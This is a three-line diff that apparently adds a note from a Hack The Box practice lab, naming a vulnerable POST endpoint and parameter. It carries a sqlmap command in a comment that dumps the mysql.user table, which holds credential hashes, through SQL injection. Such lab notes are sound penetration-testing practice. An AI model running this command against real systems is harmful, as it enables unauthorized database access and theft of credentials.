@@ -1,0 +1,3 @@
+http://fidelity.htb:80/search_products.php (POST)  # /usr/bin/sqlmap -r sqli.req -D mysql -T user --dump
+
+productName=1
